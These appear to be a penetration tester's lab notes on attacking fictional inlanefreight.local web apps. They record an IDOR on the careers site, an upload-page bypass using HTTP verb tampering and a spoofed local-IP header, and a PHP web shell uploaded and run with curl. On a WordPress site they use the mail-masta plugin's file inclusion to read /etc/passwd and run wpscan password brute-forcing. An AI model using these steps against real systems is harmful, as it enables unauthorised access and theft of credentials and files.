# Notes
Using the `vhosts` file I made, started with `eyewitness`.
`eyewitness -f vhosts.txt -d subdomains-inlanefreight`
Scanning through the screenshots here are the notes so far:

### Careers.Inlanefreight.local (IDOR)
Using `burp`, going through the page I found a login/create user.
Making my own user I was able to look at the job posting of the website.
Setting my eyes on the `http://careers.inlanefreight.local/profile?id=4`, this told me the IDOR is here for `Question 1` [[3-web-enumeration-&-exploitation]]

Changing the ID is burp, was able to transverse the users and find the flag.
```html
GET /profile?id=4 HTTP/1.1
Host: careers.inlanefreight.local
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.auv4ag.eB3aBFYyQnQksKhse6VDNGwcgac
Connection: keep-alive
```


### Dev.inlanefreight.local (Verb Tampering)
```bash
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

.hta.php             (Status: 403) [Size: 288]
.hta                 (Status: 403) [Size: 288]
.htpasswd.php        (Status: 403) [Size: 288]
.htpasswd            (Status: 403) [Size: 288]
.htaccess.php        (Status: 403) [Size: 288]
.htaccess            (Status: 403) [Size: 288]
css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
index.php            (Status: 200) [Size: 2048]
index.php            (Status: 200) [Size: 2048]
js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]
server-status        (Status: 403) [Size: 288]
uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
upload.php           (Status: 200) [Size: 14]
```
`Uploads` and `Upload.php` is a little suspicious.

Going to the `dev.inlanefreight.local/uploads.php`, and capturing the `GET` request, one can try multiple things. `Get, Post, Put, Track, Options`.

```bash
Capturing the Burp request.
Changing the GET to TRACK and adding a header
X-Custom-IP-Authorization


TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Custom-IP-Authorization: 127.0.0.1
Connection: keep-alive
```

Then right clicking and `open in broswer`, I am met with a new page.
Capturing the post request and changing the contents to `<?php system($_GET['cmd']); ?>` 
Making the `Content-Type: img/png`
Then `curl 'http://dev.inlanefregiht.local/uploads/shell.php?cmd=command'`.

# IR.inlanefreight.local
`curl -s http://ir.inlanefreight.local | grep WordPress`
Getting the version of `6.0`
Plugins
```bash
b2i-investor-tools
mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19 7:52am GMT (12 years ago)
 | Readme: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

feed
akismet
```

Knowing that `mail-masta` has multiple known plugin vulns.
`curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

`curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt`


Another way
`wpscan -e u -t 500 --url http://ir.inlanefreight.local`
`wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp`
